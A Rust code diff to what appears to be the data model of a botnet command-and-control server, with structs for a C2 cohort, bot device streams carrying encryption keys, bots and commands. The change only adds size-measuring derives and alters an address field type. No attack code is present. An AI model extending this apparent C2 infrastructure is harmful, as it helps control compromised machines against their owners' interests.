@@ -1,4 +1,6 @@
 extern crate core;
+use crate::communication::lib;
+
 use tokio::{
     net::{TcpListener, TcpStream},
 };
@@ -7,10 +9,9 @@ use std::{
 };
 use serde::{Deserialize, Serialize};
 use rmp_serde::{Deserializer, Serializer};
+use deepsize::DeepSizeOf;
 
-use crate::communication::lib;
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf)]
 pub struct Cohort {
     pub c2_id: Vec<u8>,
     pub is_hq: bool,
@@ -32,9 +33,9 @@ impl Cohort {
     }
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf)]
 pub struct Device_stream {
-    pub ip_address: std::net::SocketAddr,
+    pub ip_address: String,
     pub authenticated: bool,
     pub connected: bool,
     pub encryption_key: Vec<u8>,
@@ -42,8 +43,8 @@ pub struct Device_stream {
     pub B: self::Bot,
 }
 impl Device_stream {
-    pub fn new(
-        address: SocketAddr,
+    pub fn new (
+        address: String,
         authenticated: bool,
         connected: bool,
         encryption_key: Vec<u8>,
@@ -64,7 +65,7 @@ impl Device_stream {
     }
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf)]
 pub struct Bot {
     #[serde(with = "serde_bytes")]
     pub uid: Vec<u8>,
@@ -85,7 +86,7 @@ impl Bot {
     }
 }
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
+#[derive(Debug, Clone, Serialize, Deserialize, DeepSizeOf)]
 pub struct Commands {
     #[serde(with = "serde_bytes")]
     pub command: Vec<u8>,
